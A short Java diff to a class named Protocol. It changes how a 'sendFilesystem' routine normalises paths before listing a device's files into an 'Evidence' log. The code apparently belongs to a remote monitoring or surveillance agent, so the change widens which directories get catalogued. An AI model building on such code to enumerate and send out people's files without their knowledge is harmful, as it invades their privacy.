@@ -391,6 +391,8 @@ public abstract class Protocol {
         Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
         fsLog.createEvidence();
 
+        path=path.replace('\\', '/');
+        
         // Expand path and create log
         if (path.equals("/")) { //$NON-NLS-1$
             //#ifdef DEBUG
@@ -404,14 +406,13 @@ public abstract class Protocol {
             if (path.endsWith("/*")) { //$NON-NLS-1$ //$NON-NLS-2$
                 path = path.substring(0, path.length() - 2);
             }
-            if (path.startsWith("/")) {
-                expandPath(fsLog, path, depth);
-            } else {
-                //#ifdef DEBUG
-                debug.error("sendFilesystem: strange path, ignoring it. " //$NON-NLS-1$
-                        + path);
-                //#endif
+            if (!path.startsWith("/")) {
+                path = "/" + path;
             }
+            
+            
+            expandPath(fsLog, path, depth);
+
         }
 
         fsLog.close();
